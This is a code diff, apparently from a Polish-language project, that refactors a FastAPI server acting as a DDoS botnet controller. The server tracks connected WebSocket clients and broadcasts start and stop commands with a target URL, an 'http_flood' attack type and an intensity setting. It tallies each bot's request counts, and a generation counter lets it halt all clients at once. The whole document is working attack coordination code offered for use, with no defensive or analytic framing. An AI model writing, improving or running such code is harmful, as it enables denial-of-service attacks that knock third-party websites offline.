@@ -1,113 +1,101 @@
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from fastapi.middleware.cors import CORSMiddleware
-import json
-import asyncio
-import time
+import json, asyncio, time
 
 app = FastAPI()
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
-clients = {}
-client_stats = {}
-attack_started = 0.0
+clients: dict = {}
+stats: dict = {}
+current_gen = 0
 attack_running = False
-stop_task = None
+started_at = 0.0
 
-@app.websocket("/ws/{client_id}")
-async def websocket_endpoint(websocket: WebSocket, client_id: str):
+
+@app.websocket("/ws/{cid}")
+async def ws_endpoint(websocket: WebSocket, cid: str):
     await websocket.accept()
-    clients[client_id] = websocket
-    client_stats[client_id] = 0
+    clients[cid] = websocket
+    stats[cid] = 0
     try:
         while True:
-            data = await websocket.receive_text()
-            if data == "ping":
+            raw = await websocket.receive_text()
+            if raw == "ping":
                 await websocket.send_text("pong")
-            else:
-                try:
-                    msg = json.loads(data)
-                    if msg.get("action") == "stats":
-                        # Serwer akceptuje statystyki TYLKO jeśli atak trwa
-                        if attack_running:
-                            client_stats[client_id] = int(msg.get("count", 0))
-                        else:
-                            client_stats[client_id] = 0
-                except:
-                    pass
+                continue
+            try:
+                msg = json.loads(raw)
+                if (msg.get("action") == "stats"
+                        and attack_running
+                        and msg.get("gen") == current_gen):
+                    stats[cid] = int(msg.get("count", 0))
+            except Exception:
+                pass
     except WebSocketDisconnect:
-        clients.pop(client_id, None)
-        client_stats.pop(client_id, None)
+        clients.pop(cid, None)
+        stats.pop(cid, None)
+
 
 @app.get("/status")
-async def get_status():
-    total = sum(client_stats.values())
-    elapsed = time.time() - attack_started if attack_started > 0 else 0
+async def status():
     return {
         "online_count": len(clients),
         "clients": list(clients.keys()),
-        "total_requests": total,
-        "elapsed": round(elapsed, 1),
+        "total_requests": sum(stats.values()),
+        "elapsed": round(time.time() - started_at, 1) if started_at else 0,
         "running": attack_running,
-        "per_client": dict(client_stats),
+        "gen": current_gen,
+        "per_client": dict(stats),
     }
 
-async def auto_stop(duration: int):
-    await asyncio.sleep(duration)
-    await stop_all()
 
 @app.post("/command_all")
-async def send_command_all(url: str, attack_type: str = "http_flood", intensity: int = 2, duration: int = 0):
-    global attack_started, stop_task, client_stats, attack_running
+async def command_all(url: str, attack_type: str = "http_flood",
+                     intensity: int = 2, duration: int = 0):
+    global current_gen, attack_running, started_at
     if not clients:
         return {"status": "error", "message": "Brak klientów"}
+    if not url.startswith(("http://", "https://")) and not url.replace(".", "").isdigit():
+        return {"status": "error", "message": "Nieprawidłowy URL"}
 
-    if not url or (not url.startswith("http://") and not url.startswith("https://") and not url.replace(".", "").isdigit()):
-        return {"status": "error", "message": "Nieprawidłowy format URL"}
+    current_gen += 1
+    attack_running = True
+    started_at = time.time()
+    for k in stats:
+        stats[k] = 0
 
     intensity = max(1, min(16, intensity))
-
-    for k in client_stats:
-        client_stats[k] = 0
-    attack_started = time.time()
-    attack_running = True
-
-    if stop_task and not stop_task.done():
-        stop_task.cancel()
-
     payload = json.dumps({
-        "action": "start_attack",
+        "action": "start",
+        "gen": current_gen,
         "url": url,
         "attack_type": attack_type,
         "intensity": intensity,
     })
-    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()])
+    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()],
+                         return_exceptions=True)
 
     if duration > 0:
-        stop_task = asyncio.create_task(auto_stop(duration))
+        gen_snapshot = current_gen
+        asyncio.create_task(_auto_stop(duration, gen_snapshot))
 
-    return {
-        "status": "broadcasted",
-        "clients_count": len(clients),
-        "attack_type": attack_type,
-        "intensity": intensity,
-        "duration": duration,
-    }
+    return {"status": "ok", "clients": len(clients), "gen": current_gen}
+
+
+async def _auto_stop(duration: int, gen: int):
+    await asyncio.sleep(duration)
+    if gen == current_gen:
+        await stop_all()
+
 
 @app.post("/stop_all")
 async def stop_all():
-    global attack_running, attack_started, stop_task, client_stats
-    if not clients:
-        return {"status": "error"}
+    global current_gen, attack_running
+    current_gen += 1
     attack_running = False
-    attack_started = 0.0
-    if stop_task and not stop_task.done():
-        stop_task.cancel()
-        
     payload = json.dumps({"action": "stop"})
-    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()])
-    
-    # Twarde zerowanie po STOP
-    for k in client_stats:
-        client_stats[k] = 0
-        
-    return {"status": "stopped", "clients_count": len(clients)}
+    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()],
+                         return_exceptions=True)
+    for k in stats:
+        stats[k] = 0
+    return {"status": "stopped", "clients": len(clients)}
